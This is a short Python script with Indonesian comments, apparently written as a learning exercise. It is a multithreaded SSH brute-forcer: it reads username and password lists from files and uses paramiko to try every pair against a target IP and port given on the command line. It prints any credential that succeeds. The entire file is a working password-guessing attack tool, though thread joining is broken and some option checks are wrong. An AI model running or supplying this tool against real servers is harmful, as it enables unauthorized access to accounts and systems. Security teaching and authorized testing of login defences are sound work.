import sys # untuk baca argumen ketika run 
from getopt import getopt #untuk ambil value dari argument 
import paramiko # untuk bikin ssh client 
import threading # berguna untuk jalanin beberapa proses sekaligus



# print("hello")

ip = ""
port = 0
usernameList = []
passwordList = []
connected = threading.Event()
combination = []

def appendFromFile(fileSource):
    file =  open(fileSource, "r")
    # print(file.readlines())

    list = []

    for line in file.readlines():

        print(line.strip("\n"))
        list.append(line.strip("\n"))

    return list


def establishConnection():
    global connected, combination
    for u in usernameList:
        for p in passwordList:
            if connected.is_set():
                return
            
            if (u, p) in combination:
                continue
            else:
                combination.append((u, p))

            ssh_client = paramiko.SSHClient()
            
            # set key 
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # coba connect 
            # ip, port, username, password
            # ssh_client.connect(ip, port, u, p)

            try:
                ssh_client.connect(ip, port, u, p)
                print(f"succesfully connected with credential {u}:{p}")
                connected.set()
            except Exception as e:
                print(f"{u}:{p}, error!~ {e}")

            finally:
                ssh_client.close()





def ssh():

    global usernameList, passwordList

    usernameList = appendFromFile("usernames.txt")
    
    passwordList = appendFromFile("passwords.txt")
    
    #bikin connection ke server
    #establishConnection()
    threadList = []

    for i in range(8):
        thread = threading.Thread(target=establishConnection)
        thread.start()
    
    for thread in threadList:
        thread.join()




def main():
    global ip, port

    # print(sys.argv[1:])
    # paramter: list argumen kita, ada dua option : short dan long 
    opts, argv = getopt(sys.argv[1:], "i:p:h", ["ip=", "port=", "help"])
    # print(f"Opts: {opts}")
    # print(f"Argv: ")

    for opt, value in opts:
        print(f"opt: {opt}, value: {value}")

        if opt == "-i" or opt == "-ip":
            ip = value
        if opt == "-p" or opt == "-port":
            port = int(value)

    print(f"IP: {ip}")
    print(f"PORT: {port}")

    if ip == "":
        print("Ip must be filled !")
        exit()
    elif port == 0:
        port = 22

    ssh()


main()
